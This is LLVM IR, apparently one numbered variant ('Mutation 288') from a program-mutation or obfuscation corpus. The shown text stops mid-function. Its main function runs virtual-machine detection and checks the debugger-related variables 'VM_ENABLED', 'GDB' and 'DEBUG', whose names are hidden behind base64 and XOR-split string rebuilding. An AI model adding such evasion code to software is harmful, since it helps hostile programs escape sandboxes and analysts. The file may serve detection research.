; Mutation 288
; ModuleID = 'optimized.bc'
source_filename = "llvm-link"
target datalayout = "e-m:e-p:32:32-p270:32:32-p271:32:32-p272:64:64-f64:32:64-f80:32-n8:16:32-S128"
target triple = "i386-pc-linux-gnu"

@fpstt = internal unnamed_addr global i32 0
@fp_status.0 = internal unnamed_addr global i8 0
@stack = internal global [4194304 x i32] zeroinitializer, align 16
@segs.0 = internal unnamed_addr global i1 false
@_ZL6segmem = internal global [1024 x i8] zeroinitializer, align 1
@onUnfallback = common local_unnamed_addr global i1 false
declare i8* @base64_decode(i8*)

; Function Attrs: mustprogress nofree norecurse nosync nounwind uwtable willreturn
define internal fastcc void @helper_fldl_ST0(i64 noundef %0) unnamed_addr #0 {
._crit_edge:
  %1 = load i32, i32* @fpstt, align 16
  %.pre = and i64 %0, 4503599627370495
  %.pre1 = and i64 %0, 9218868437227405312
  %phi.cmp = icmp ne i64 %.pre1, 9218868437227405312
  %phi.cmp3 = icmp eq i64 %.pre, 0
  %2 = or i1 %phi.cmp, %phi.cmp3
  br i1 %2, label %float64_to_floatx80.18.exit, label %3

3:                                                ; preds = %._crit_edge
  %4 = and i64 %0, 9221120237041090560
  %5 = icmp ne i64 %4, 9218868437227405312
  %6 = and i64 %0, 2251799813685247
  %7 = icmp eq i64 %6, 0
  %8 = or i1 %5, %7
  br i1 %8, label %float64_to_floatx80.18.exit, label %.sink.split.i

.sink.split.i:                                    ; preds = %3
  %9 = load i8, i8* @fp_status.0, align 1
  %10 = or i8 %9, 1
  store i8 %10, i8* @fp_status.0, align 1
  br label %float64_to_floatx80.18.exit

float64_to_floatx80.18.exit:                      ; preds = %.sink.split.i, %3, %._crit_edge
  %11 = add i32 %1, 7
  %12 = and i32 %11, 7
  store i32 %12, i32* @fpstt, align 16
  ret void
}

; Function Attrs: mustprogress nofree norecurse nosync nounwind uwtable willreturn writeonly
define internal fastcc void @helper_fninit() unnamed_addr #1 {
  store i32 0, i32* @fpstt, align 16
  ret void
}

; Function Attrs: naked noinline
declare dso_local i32 @printf(i8* noundef, ...) local_unnamed_addr #2

; Function Attrs: mustprogress nounwind uwtable
define internal x86_fastcallcc i64 @helper_stub_trampoline(i32 inreg noundef %0, i32 inreg noundef %1, i32 noundef %2, i32 noundef %3) local_unnamed_addr #3 {
  %5 = alloca double, align 8
  %6 = tail call { i32, i32 } asm "movl    %esp, %ebx\0A\09movl    $2, %esp\0A\09calll   *$3\0A\09movl    %ebx, %esp", "={ax},={dx},r,r,{cx},{dx},~{ebx},~{dirflag},~{fpsr},~{flags}"(i32 %2, i32 %3, i32 %0, i32 %1) #9
  %7 = extractvalue { i32, i32 } %6, 0
  %8 = extractvalue { i32, i32 } %6, 1
  %9 = bitcast double* %5 to i8*
  call void @llvm.lifetime.start.p0i8(i64 8, i8* nonnull %9) #10
  call void asm "fstpl   $0", "=*m,~{dirflag},~{fpsr},~{flags}"(double* nonnull elementtype(double) %5) #10
  %10 = load double, double* %5, align 8, !tbaa !6
  %11 = fptoui double %10 to i64
  call fastcc void @helper_fldl_ST0(i64 noundef %11) #11
  %12 = zext i32 %8 to i64
  %13 = shl nuw i64 %12, 32
  %14 = zext i32 %7 to i64
  %15 = or i64 %13, %14
  call void @llvm.lifetime.end.p0i8(i64 8, i8* nonnull %9) #10
  ret i64 %15
}

; Function Attrs: argmemonly nofree nosync nounwind willreturn
declare void @llvm.lifetime.start.p0i8(i64 immarg, i8* nocapture) #4

; Function Attrs: argmemonly nofree nosync nounwind willreturn
declare void @llvm.lifetime.end.p0i8(i64 immarg, i8* nocapture) #4

; Function Attrs: norecurse nounwind uwtable
define dso_local noundef i32 @main(i32 noundef %0, i8** noundef %1, i8** noundef %2) local_unnamed_addr #5 {
  %4 = tail call i32 asm "pushf\0A\09popl $0", "=r,~{dirflag},~{fpsr},~{flags}"() #9
  store i1 true, i1* @segs.0, align 1
  tail call fastcc void @helper_fninit() #11
  %5 = ptrtoint i8** %2 to i32
  store i32 %5, i32* getelementptr inbounds ([4194304 x i32], [4194304 x i32]* @stack, i32 0, i32 4194303), align 4, !tbaa !10
  %6 = ptrtoint i8** %1 to i32
  store i32 %6, i32* getelementptr inbounds ([4194304 x i32], [4194304 x i32]* @stack, i32 0, i32 4194302), align 8, !tbaa !10
  store i32 %0, i32* getelementptr inbounds ([4194304 x i32], [4194304 x i32]* @stack, i32 0, i32 4194301), align 4, !tbaa !10
  %7 = tail call i8* @llvm.returnaddress(i32 0)
  %8 = ptrtoint i8* %7 to i32
  store i32 %8, i32* getelementptr inbounds ([4194304 x i32], [4194304 x i32]* @stack, i32 0, i32 4194300), align 16, !tbaa !10
  tail call fastcc void @Func_main(i32 ptrtoint (i32* getelementptr inbounds ([4194304 x i32], [4194304 x i32]* @stack, i32 0, i32 4194300) to i32)) #10
  ret i32 0
}

; Function Attrs: nofree nosync nounwind readnone willreturn
declare i8* @llvm.returnaddress(i32 immarg) #6

; Function Attrs: noinline
declare i32 @strcmp(i32, i32) local_unnamed_addr #7

; Function Attrs: noinline
declare i32 @close(i32) local_unnamed_addr #7

; Function Attrs: noinline
declare i32 @fwrite(i32, i32, i32, i32) local_unnamed_addr #7

; Function Attrs: noinline
declare i32 @socket(i32, i32, i32) local_unnamed_addr #7

; Function Attrs: noinline
declare i32 @fclose(i32) local_unnamed_addr #7

; Function Attrs: noinline
declare i32 @fopen(i32, i32) local_unnamed_addr #7

declare i32 @getenv(i32) local_unnamed_addr noinline
; Function Attrs: norecurse
;-------------------------------
;--------Extra functions--------
declare i32 @rand() local_unnamed_addr  noinline

declare void @srand(i32) local_unnamed_addr  noinline 

declare i32 @time(i32) local_unnamed_addr noinline 

declare i32 @detect_vm()
;-------------------------------
declare dso_local i32 @puts(i8* noundef) local_unnamed_addr #3
define internal fastcc void @Func_main(i32 %arg_esp) unnamed_addr #8 !retregs !12 {
Func_804941F.exit.i:
;----------------------------
  ; Detect if we are running in a VMWare vm
  %result.91 = tail call i32 @detect_vm()
  %must.escape.91 = icmp ne i32 %result.91, 0
  br i1 %must.escape.91, label %.escape.91, label %.proceed.91
.proceed.91:
;----------------------------
  %time79 = tail call i32 @time(i32 ptrtoint (i8* null to i32))
  tail call void @srand(i32 %time79)
  %rand_init88 = tail call i32 @rand()
  %rand_fin89 = srem i32 %rand_init88, 8
  %rand_init84 = tail call i32 @rand()
  %rand_fin85 = srem i32 %rand_init84, 8
  %rand_init80 = tail call i32 @rand()
  %rand_fin81 = srem i32 %rand_init80, 8
;----------------------------
  ; Detect debug environment
;-------------------------------
;----------Random Cond----------
  %.not90.i.i = icmp eq i32 4 , %rand_fin89 
  br i1 %.not90.i.i, label %next90, label %BB_82
next90:
;-------------------------------
  %debug.str.2.27 = alloca [11 x i8]
;-------------------------------
; Replace: store [11 x i8] c"VM_ENABLED\00", [11 x i8]* %debug.str.2.27
  %cipher.ptr.41 = alloca [17 x i8]
;-------------------------------
; Replace: store [17 x i8] c"\56\6b\31\66\52\55\35\42\51\6b\78\46\52\41\41\3d\00", [17 x i8]* %cipher.ptr.41
  %sp53 = alloca [17 x i8]

  
  %sp0.53 = bitcast [17 x i8]* %sp53 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\56", [1 x i8]* %sp0.53
  %sp0.92 = alloca [1 x i8]
  store [1 x i8] c"\3A", [1 x i8]* %sp0.92
  %sp0.1.92 = bitcast [1 x i8]* %sp0.92 to i8*
  %i0.92 = load i8, i8* %sp0.1.92

  %sp1.92 = alloca [1 x i8]
  store [1 x i8] c"\6c", [1 x i8]* %sp1.92
  %sp1.1.92 = bitcast [1 x i8]* %sp1.92 to i8*
  %i1.92 = load i8, i8* %sp1.1.92

  %xp92 = xor i8 %i0.92, %i1.92

  %fi.92 = alloca i8
  store i8 %xp92, i8* %fi.92

  %final.ptr.92 = bitcast i8* %fi.92 to [1 x i8]*
  %spi92 = load [1 x i8], [1 x i8]* %final.ptr.92
  store [1 x i8] %spi92, [1 x i8]* %sp0.53
;-------------------------------
  %next0.53 = getelementptr [17 x i8], [17 x i8]* %sp53, i32 0, i32 1
  
  %sp1.53 = bitcast i8* %next0.53 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\6b\31", [2 x i8]* %sp1.53
  %sp0.93 = alloca [2 x i8]
  store [2 x i8] c"\59\75", [2 x i8]* %sp0.93
  %sp0.1.93 = bitcast [2 x i8]* %sp0.93 to i16*
  %i0.93 = load i16, i16* %sp0.1.93

  %sp1.93 = alloca [2 x i8]
  store [2 x i8] c"\32\44", [2 x i8]* %sp1.93
  %sp1.1.93 = bitcast [2 x i8]* %sp1.93 to i16*
  %i1.93 = load i16, i16* %sp1.1.93

  %xp93 = xor i16 %i0.93, %i1.93

  %fi.93 = alloca i16
  store i16 %xp93, i16* %fi.93

  %final.ptr.93 = bitcast i16* %fi.93 to [2 x i8]*
  %spi93 = load [2 x i8], [2 x i8]* %final.ptr.93
  store [2 x i8] %spi93, [2 x i8]* %sp1.53
;-------------------------------
  %next1.53 = getelementptr [17 x i8], [17 x i8]* %sp53, i32 0, i32 3
  
  %sp2.53 = bitcast i8* %next1.53 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\66\52", [2 x i8]* %sp2.53
  %sp0.94 = alloca [2 x i8]
  store [2 x i8] c"\31\04", [2 x i8]* %sp0.94
  %sp0.1.94 = bitcast [2 x i8]* %sp0.94 to i16*
  %i0.94 = load i16, i16* %sp0.1.94

  %sp1.94 = alloca [2 x i8]
  store [2 x i8] c"\57\56", [2 x i8]* %sp1.94
  %sp1.1.94 = bitcast [2 x i8]* %sp1.94 to i16*
  %i1.94 = load i16, i16* %sp1.1.94

  %xp94 = xor i16 %i0.94, %i1.94

  %fi.94 = alloca i16
  store i16 %xp94, i16* %fi.94

  %final.ptr.94 = bitcast i16* %fi.94 to [2 x i8]*
  %spi94 = load [2 x i8], [2 x i8]* %final.ptr.94
  store [2 x i8] %spi94, [2 x i8]* %sp2.53
;-------------------------------
  %next2.53 = getelementptr [17 x i8], [17 x i8]* %sp53, i32 0, i32 5
  
  %sp3.53 = bitcast i8* %next2.53 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\55\35", [2 x i8]* %sp3.53
  %sp0.95 = alloca [2 x i8]
  store [2 x i8] c"\05\70", [2 x i8]* %sp0.95
  %sp0.1.95 = bitcast [2 x i8]* %sp0.95 to i16*
  %i0.95 = load i16, i16* %sp0.1.95

  %sp1.95 = alloca [2 x i8]
  store [2 x i8] c"\50\45", [2 x i8]* %sp1.95
  %sp1.1.95 = bitcast [2 x i8]* %sp1.95 to i16*
  %i1.95 = load i16, i16* %sp1.1.95

  %xp95 = xor i16 %i0.95, %i1.95

  %fi.95 = alloca i16
  store i16 %xp95, i16* %fi.95

  %final.ptr.95 = bitcast i16* %fi.95 to [2 x i8]*
  %spi95 = load [2 x i8], [2 x i8]* %final.ptr.95
  store [2 x i8] %spi95, [2 x i8]* %sp3.53
;-------------------------------
  %next3.53 = getelementptr [17 x i8], [17 x i8]* %sp53, i32 0, i32 7
  
  %sp4.53 = bitcast i8* %next3.53 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\42\51", [2 x i8]* %sp4.53
  %sp0.96 = alloca [2 x i8]
  store [2 x i8] c"\28\21", [2 x i8]* %sp0.96
  %sp0.1.96 = bitcast [2 x i8]* %sp0.96 to i16*
  %i0.96 = load i16, i16* %sp0.1.96

  %sp1.96 = alloca [2 x i8]
  store [2 x i8] c"\6a\70", [2 x i8]* %sp1.96
  %sp1.1.96 = bitcast [2 x i8]* %sp1.96 to i16*
  %i1.96 = load i16, i16* %sp1.1.96

  %xp96 = xor i16 %i0.96, %i1.96

  %fi.96 = alloca i16
  store i16 %xp96, i16* %fi.96

  %final.ptr.96 = bitcast i16* %fi.96 to [2 x i8]*
  %spi96 = load [2 x i8], [2 x i8]* %final.ptr.96
  store [2 x i8] %spi96, [2 x i8]* %sp4.53
;-------------------------------
  %next4.53 = getelementptr [17 x i8], [17 x i8]* %sp53, i32 0, i32 9
  
  %sp5.53 = bitcast i8* %next4.53 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\6b\78", [2 x i8]* %sp5.53
  %sp0.97 = alloca [2 x i8]
  store [2 x i8] c"\13\4D", [2 x i8]* %sp0.97
  %sp0.1.97 = bitcast [2 x i8]* %sp0.97 to i16*
  %i0.97 = load i16, i16* %sp0.1.97

  %sp1.97 = alloca [2 x i8]
  store [2 x i8] c"\78\35", [2 x i8]* %sp1.97
  %sp1.1.97 = bitcast [2 x i8]* %sp1.97 to i16*
  %i1.97 = load i16, i16* %sp1.1.97

  %xp97 = xor i16 %i0.97, %i1.97

  %fi.97 = alloca i16
  store i16 %xp97, i16* %fi.97

  %final.ptr.97 = bitcast i16* %fi.97 to [2 x i8]*
  %spi97 = load [2 x i8], [2 x i8]* %final.ptr.97
  store [2 x i8] %spi97, [2 x i8]* %sp5.53
;-------------------------------
  %next5.53 = getelementptr [17 x i8], [17 x i8]* %sp53, i32 0, i32 11
  
  %sp6.53 = bitcast i8* %next5.53 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\46\52", [2 x i8]* %sp6.53
  %sp0.98 = alloca [2 x i8]
  store [2 x i8] c"\70\1A", [2 x i8]* %sp0.98
  %sp0.1.98 = bitcast [2 x i8]* %sp0.98 to i16*
  %i0.98 = load i16, i16* %sp0.1.98

  %sp1.98 = alloca [2 x i8]
  store [2 x i8] c"\36\48", [2 x i8]* %sp1.98
  %sp1.1.98 = bitcast [2 x i8]* %sp1.98 to i16*
  %i1.98 = load i16, i16* %sp1.1.98

  %xp98 = xor i16 %i0.98, %i1.98

  %fi.98 = alloca i16
  store i16 %xp98, i16* %fi.98

  %final.ptr.98 = bitcast i16* %fi.98 to [2 x i8]*
  %spi98 = load [2 x i8], [2 x i8]* %final.ptr.98
  store [2 x i8] %spi98, [2 x i8]* %sp6.53
;-------------------------------
  %next6.53 = getelementptr [17 x i8], [17 x i8]* %sp53, i32 0, i32 13
  
  %sp7.53 = bitcast i8* %next6.53 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\41\41", [2 x i8]* %sp7.53
  %sp0.99 = alloca [2 x i8]
  store [2 x i8] c"\16\73", [2 x i8]* %sp0.99
  %sp0.1.99 = bitcast [2 x i8]* %sp0.99 to i16*
  %i0.99 = load i16, i16* %sp0.1.99

  %sp1.99 = alloca [2 x i8]
  store [2 x i8] c"\57\32", [2 x i8]* %sp1.99
  %sp1.1.99 = bitcast [2 x i8]* %sp1.99 to i16*
  %i1.99 = load i16, i16* %sp1.1.99

  %xp99 = xor i16 %i0.99, %i1.99

  %fi.99 = alloca i16
  store i16 %xp99, i16* %fi.99

  %final.ptr.99 = bitcast i16* %fi.99 to [2 x i8]*
  %spi99 = load [2 x i8], [2 x i8]* %final.ptr.99
  store [2 x i8] %spi99, [2 x i8]* %sp7.53
;-------------------------------
  %next7.53 = getelementptr [17 x i8], [17 x i8]* %sp53, i32 0, i32 15
  
  %sp8.53 = bitcast i8* %next7.53 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\3d\00", [2 x i8]* %sp8.53
  %sp0.100 = alloca [2 x i8]
  store [2 x i8] c"\7B\4D", [2 x i8]* %sp0.100
  %sp0.1.100 = bitcast [2 x i8]* %sp0.100 to i16*
  %i0.100 = load i16, i16* %sp0.1.100

  %sp1.100 = alloca [2 x i8]
  store [2 x i8] c"\46\4d", [2 x i8]* %sp1.100
  %sp1.1.100 = bitcast [2 x i8]* %sp1.100 to i16*
  %i1.100 = load i16, i16* %sp1.1.100

  %xp100 = xor i16 %i0.100, %i1.100

  %fi.100 = alloca i16
  store i16 %xp100, i16* %fi.100

  %final.ptr.100 = bitcast i16* %fi.100 to [2 x i8]*
  %spi100 = load [2 x i8], [2 x i8]* %final.ptr.100
  store [2 x i8] %spi100, [2 x i8]* %sp8.53
;-------------------------------

  %spi53 = load [17 x i8], [17 x i8]* %sp53
  store [17 x i8] %spi53, [17 x i8]* %cipher.ptr.41
;-------------------------------
  %cipher.41 = getelementptr inbounds [17 x i8], [17 x i8]* %cipher.ptr.41, i32 0, i32 0
  %plain.ptr.41 = tail call i8* @base64_decode(i8* %cipher.41)
  %tmp.41 = bitcast i8* %plain.ptr.41 to [11 x i8]*
  %spi41 = load [11 x i8], [11 x i8]* %tmp.41
  store [11 x i8] %spi41, [11 x i8]* %debug.str.2.27
;-------------------------------
  %debug.ptr.2.27 = ptrtoint [11 x i8]* %debug.str.2.27 to i32
  %result.2.27 = tail call i32 @getenv(i32 %debug.ptr.2.27)
  %must.escape.2.27 = icmp ne i32 %result.2.27, 0
  br i1 %must.escape.2.27, label %.escape.27, label %.proceed.2.27
.proceed.2.27:
;----------------------------
;----------------------------
  ; Detect debug environment
  %debug.str.1.27 = alloca [4 x i8]
;-------------------------------
; Replace: store [4 x i8] c"GDB\00", [4 x i8]* %debug.str.1.27
  %cipher.ptr.42 = alloca [9 x i8]
;-------------------------------
; Replace: store [9 x i8] c"\52\30\52\43\41\41\3d\3d\00", [9 x i8]* %cipher.ptr.42
  %sp54 = alloca [9 x i8]

  
  %sp0.54 = bitcast [9 x i8]* %sp54 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\52", [1 x i8]* %sp0.54
  %sp0.101 = alloca [1 x i8]
  store [1 x i8] c"\6A", [1 x i8]* %sp0.101
  %sp0.1.101 = bitcast [1 x i8]* %sp0.101 to i8*
  %i0.101 = load i8, i8* %sp0.1.101

  %sp1.101 = alloca [1 x i8]
  store [1 x i8] c"\38", [1 x i8]* %sp1.101
  %sp1.1.101 = bitcast [1 x i8]* %sp1.101 to i8*
  %i1.101 = load i8, i8* %sp1.1.101

  %xp101 = xor i8 %i0.101, %i1.101

  %fi.101 = alloca i8
  store i8 %xp101, i8* %fi.101

  %final.ptr.101 = bitcast i8* %fi.101 to [1 x i8]*
  %spi101 = load [1 x i8], [1 x i8]* %final.ptr.101
  store [1 x i8] %spi101, [1 x i8]* %sp0.54
;-------------------------------
  %next0.54 = getelementptr [9 x i8], [9 x i8]* %sp54, i32 0, i32 1
  
  %sp1.54 = bitcast i8* %next0.54 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\30", [1 x i8]* %sp1.54
  %sp0.102 = alloca [1 x i8]
  store [1 x i8] c"\61", [1 x i8]* %sp0.102
  %sp0.1.102 = bitcast [1 x i8]* %sp0.102 to i8*
  %i0.102 = load i8, i8* %sp0.1.102

  %sp1.102 = alloca [1 x i8]
  store [1 x i8] c"\51", [1 x i8]* %sp1.102
  %sp1.1.102 = bitcast [1 x i8]* %sp1.102 to i8*
  %i1.102 = load i8, i8* %sp1.1.102

  %xp102 = xor i8 %i0.102, %i1.102

  %fi.102 = alloca i8
  store i8 %xp102, i8* %fi.102

  %final.ptr.102 = bitcast i8* %fi.102 to [1 x i8]*
  %spi102 = load [1 x i8], [1 x i8]* %final.ptr.102
  store [1 x i8] %spi102, [1 x i8]* %sp1.54
;-------------------------------
  %next1.54 = getelementptr [9 x i8], [9 x i8]* %sp54, i32 0, i32 2
  
  %sp2.54 = bitcast i8* %next1.54 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\52", [1 x i8]* %sp2.54
  %sp0.103 = alloca [1 x i8]
  store [1 x i8] c"\23", [1 x i8]* %sp0.103
  %sp0.1.103 = bitcast [1 x i8]* %sp0.103 to i8*
  %i0.103 = load i8, i8* %sp0.1.103

  %sp1.103 = alloca [1 x i8]
  store [1 x i8] c"\71", [1 x i8]* %sp1.103
  %sp1.1.103 = bitcast [1 x i8]* %sp1.103 to i8*
  %i1.103 = load i8, i8* %sp1.1.103

  %xp103 = xor i8 %i0.103, %i1.103

  %fi.103 = alloca i8
  store i8 %xp103, i8* %fi.103

  %final.ptr.103 = bitcast i8* %fi.103 to [1 x i8]*
  %spi103 = load [1 x i8], [1 x i8]* %final.ptr.103
  store [1 x i8] %spi103, [1 x i8]* %sp2.54
;-------------------------------
  %next2.54 = getelementptr [9 x i8], [9 x i8]* %sp54, i32 0, i32 3
  
  %sp3.54 = bitcast i8* %next2.54 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\43", [1 x i8]* %sp3.54
  %sp0.104 = alloca [1 x i8]
  store [1 x i8] c"\3A", [1 x i8]* %sp0.104
  %sp0.1.104 = bitcast [1 x i8]* %sp0.104 to i8*
  %i0.104 = load i8, i8* %sp0.1.104

  %sp1.104 = alloca [1 x i8]
  store [1 x i8] c"\79", [1 x i8]* %sp1.104
  %sp1.1.104 = bitcast [1 x i8]* %sp1.104 to i8*
  %i1.104 = load i8, i8* %sp1.1.104

  %xp104 = xor i8 %i0.104, %i1.104

  %fi.104 = alloca i8
  store i8 %xp104, i8* %fi.104

  %final.ptr.104 = bitcast i8* %fi.104 to [1 x i8]*
  %spi104 = load [1 x i8], [1 x i8]* %final.ptr.104
  store [1 x i8] %spi104, [1 x i8]* %sp3.54
;-------------------------------
  %next3.54 = getelementptr [9 x i8], [9 x i8]* %sp54, i32 0, i32 4
  
  %sp4.54 = bitcast i8* %next3.54 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\41", [1 x i8]* %sp4.54
  %sp0.105 = alloca [1 x i8]
  store [1 x i8] c"\2E", [1 x i8]* %sp0.105
  %sp0.1.105 = bitcast [1 x i8]* %sp0.105 to i8*
  %i0.105 = load i8, i8* %sp0.1.105

  %sp1.105 = alloca [1 x i8]
  store [1 x i8] c"\6f", [1 x i8]* %sp1.105
  %sp1.1.105 = bitcast [1 x i8]* %sp1.105 to i8*
  %i1.105 = load i8, i8* %sp1.1.105

  %xp105 = xor i8 %i0.105, %i1.105

  %fi.105 = alloca i8
  store i8 %xp105, i8* %fi.105

  %final.ptr.105 = bitcast i8* %fi.105 to [1 x i8]*
  %spi105 = load [1 x i8], [1 x i8]* %final.ptr.105
  store [1 x i8] %spi105, [1 x i8]* %sp4.54
;-------------------------------
  %next4.54 = getelementptr [9 x i8], [9 x i8]* %sp54, i32 0, i32 5
  
  %sp5.54 = bitcast i8* %next4.54 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\41", [1 x i8]* %sp5.54
  %sp0.106 = alloca [1 x i8]
  store [1 x i8] c"\34", [1 x i8]* %sp0.106
  %sp0.1.106 = bitcast [1 x i8]* %sp0.106 to i8*
  %i0.106 = load i8, i8* %sp0.1.106

  %sp1.106 = alloca [1 x i8]
  store [1 x i8] c"\75", [1 x i8]* %sp1.106
  %sp1.1.106 = bitcast [1 x i8]* %sp1.106 to i8*
  %i1.106 = load i8, i8* %sp1.1.106

  %xp106 = xor i8 %i0.106, %i1.106

  %fi.106 = alloca i8
  store i8 %xp106, i8* %fi.106

  %final.ptr.106 = bitcast i8* %fi.106 to [1 x i8]*
  %spi106 = load [1 x i8], [1 x i8]* %final.ptr.106
  store [1 x i8] %spi106, [1 x i8]* %sp5.54
;-------------------------------
  %next5.54 = getelementptr [9 x i8], [9 x i8]* %sp54, i32 0, i32 6
  
  %sp6.54 = bitcast i8* %next5.54 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\3d", [1 x i8]* %sp6.54
  %sp0.107 = alloca [1 x i8]
  store [1 x i8] c"\7E", [1 x i8]* %sp0.107
  %sp0.1.107 = bitcast [1 x i8]* %sp0.107 to i8*
  %i0.107 = load i8, i8* %sp0.1.107

  %sp1.107 = alloca [1 x i8]
  store [1 x i8] c"\43", [1 x i8]* %sp1.107
  %sp1.1.107 = bitcast [1 x i8]* %sp1.107 to i8*
  %i1.107 = load i8, i8* %sp1.1.107

  %xp107 = xor i8 %i0.107, %i1.107

  %fi.107 = alloca i8
  store i8 %xp107, i8* %fi.107

  %final.ptr.107 = bitcast i8* %fi.107 to [1 x i8]*
  %spi107 = load [1 x i8], [1 x i8]* %final.ptr.107
  store [1 x i8] %spi107, [1 x i8]* %sp6.54
;-------------------------------
  %next6.54 = getelementptr [9 x i8], [9 x i8]* %sp54, i32 0, i32 7
  
  %sp7.54 = bitcast i8* %next6.54 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\3d", [1 x i8]* %sp7.54
  %sp0.108 = alloca [1 x i8]
  store [1 x i8] c"\47", [1 x i8]* %sp0.108
  %sp0.1.108 = bitcast [1 x i8]* %sp0.108 to i8*
  %i0.108 = load i8, i8* %sp0.1.108

  %sp1.108 = alloca [1 x i8]
  store [1 x i8] c"\7a", [1 x i8]* %sp1.108
  %sp1.1.108 = bitcast [1 x i8]* %sp1.108 to i8*
  %i1.108 = load i8, i8* %sp1.1.108

  %xp108 = xor i8 %i0.108, %i1.108

  %fi.108 = alloca i8
  store i8 %xp108, i8* %fi.108

  %final.ptr.108 = bitcast i8* %fi.108 to [1 x i8]*
  %spi108 = load [1 x i8], [1 x i8]* %final.ptr.108
  store [1 x i8] %spi108, [1 x i8]* %sp7.54
;-------------------------------
  %next7.54 = getelementptr [9 x i8], [9 x i8]* %sp54, i32 0, i32 8
  
  %sp8.54 = bitcast i8* %next7.54 to [1 x i8]*
  store [1 x i8] c"\00", [1 x i8]* %sp8.54

  %spi54 = load [9 x i8], [9 x i8]* %sp54
  store [9 x i8] %spi54, [9 x i8]* %cipher.ptr.42
;-------------------------------
  %cipher.42 = getelementptr inbounds [9 x i8], [9 x i8]* %cipher.ptr.42, i32 0, i32 0
  %plain.ptr.42 = tail call i8* @base64_decode(i8* %cipher.42)
  %tmp.42 = bitcast i8* %plain.ptr.42 to [4 x i8]*
  %spi42 = load [4 x i8], [4 x i8]* %tmp.42
  store [4 x i8] %spi42, [4 x i8]* %debug.str.1.27
;-------------------------------
  %debug.ptr.1.27 = ptrtoint [4 x i8]* %debug.str.1.27 to i32
  %result.1.27 = tail call i32 @getenv(i32 %debug.ptr.1.27)
  %must.escape.1.27 = icmp ne i32 %result.1.27, 0
  br i1 %must.escape.1.27, label %.escape.27, label %.proceed.1.27
.proceed.1.27:
;----------------------------
;----------------------------
  ; Detect debug environment
  %debug.str.0.27 = alloca [6 x i8]
;-------------------------------
; Replace: store [6 x i8] c"DEBUG\00", [6 x i8]* %debug.str.0.27
  %cipher.ptr.43 = alloca [9 x i8]
;-------------------------------
; Replace: store [9 x i8] c"\52\45\56\43\56\55\63\41\00", [9 x i8]* %cipher.ptr.43
  %sp55 = alloca [9 x i8]

  
  %sp0.55 = bitcast [9 x i8]* %sp55 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\52", [1 x i8]* %sp0.55
  %sp0.109 = alloca [1 x i8]
  store [1 x i8] c"\1A", [1 x i8]* %sp0.109
  %sp0.1.109 = bitcast [1 x i8]* %sp0.109 to i8*
  %i0.109 = load i8, i8* %sp0.1.109

  %sp1.109 = alloca [1 x i8]
  store [1 x i8] c"\48", [1 x i8]* %sp1.109
  %sp1.1.109 = bitcast [1 x i8]* %sp1.109 to i8*
  %i1.109 = load i8, i8* %sp1.1.109

  %xp109 = xor i8 %i0.109, %i1.109

  %fi.109 = alloca i8
  store i8 %xp109, i8* %fi.109

  %final.ptr.109 = bitcast i8* %fi.109 to [1 x i8]*
  %spi109 = load [1 x i8], [1 x i8]* %final.ptr.109
  store [1 x i8] %spi109, [1 x i8]* %sp0.55
;-------------------------------
  %next0.55 = getelementptr [9 x i8], [9 x i8]* %sp55, i32 0, i32 1
  
  %sp1.55 = bitcast i8* %next0.55 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\45", [1 x i8]* %sp1.55
  %sp0.110 = alloca [1 x i8]
  store [1 x i8] c"\33", [1 x i8]* %sp0.110
  %sp0.1.110 = bitcast [1 x i8]* %sp0.110 to i8*
  %i0.110 = load i8, i8* %sp0.1.110

  %sp1.110 = alloca [1 x i8]
  store [1 x i8] c"\76", [1 x i8]* %sp1.110
  %sp1.1.110 = bitcast [1 x i8]* %sp1.110 to i8*
  %i1.110 = load i8, i8* %sp1.1.110

  %xp110 = xor i8 %i0.110, %i1.110

  %fi.110 = alloca i8
  store i8 %xp110, i8* %fi.110

  %final.ptr.110 = bitcast i8* %fi.110 to [1 x i8]*
  %spi110 = load [1 x i8], [1 x i8]* %final.ptr.110
  store [1 x i8] %spi110, [1 x i8]* %sp1.55
;-------------------------------
  %next1.55 = getelementptr [9 x i8], [9 x i8]* %sp55, i32 0, i32 2
  
  %sp2.55 = bitcast i8* %next1.55 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\56", [1 x i8]* %sp2.55
  %sp0.111 = alloca [1 x i8]
  store [1 x i8] c"\62", [1 x i8]* %sp0.111
  %sp0.1.111 = bitcast [1 x i8]* %sp0.111 to i8*
  %i0.111 = load i8, i8* %sp0.1.111

  %sp1.111 = alloca [1 x i8]
  store [1 x i8] c"\34", [1 x i8]* %sp1.111
  %sp1.1.111 = bitcast [1 x i8]* %sp1.111 to i8*
  %i1.111 = load i8, i8* %sp1.1.111

  %xp111 = xor i8 %i0.111, %i1.111

  %fi.111 = alloca i8
  store i8 %xp111, i8* %fi.111

  %final.ptr.111 = bitcast i8* %fi.111 to [1 x i8]*
  %spi111 = load [1 x i8], [1 x i8]* %final.ptr.111
  store [1 x i8] %spi111, [1 x i8]* %sp2.55
;-------------------------------
  %next2.55 = getelementptr [9 x i8], [9 x i8]* %sp55, i32 0, i32 3
  
  %sp3.55 = bitcast i8* %next2.55 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\43", [1 x i8]* %sp3.55
  %sp0.112 = alloca [1 x i8]
  store [1 x i8] c"\32", [1 x i8]* %sp0.112
  %sp0.1.112 = bitcast [1 x i8]* %sp0.112 to i8*
  %i0.112 = load i8, i8* %sp0.1.112

  %sp1.112 = alloca [1 x i8]
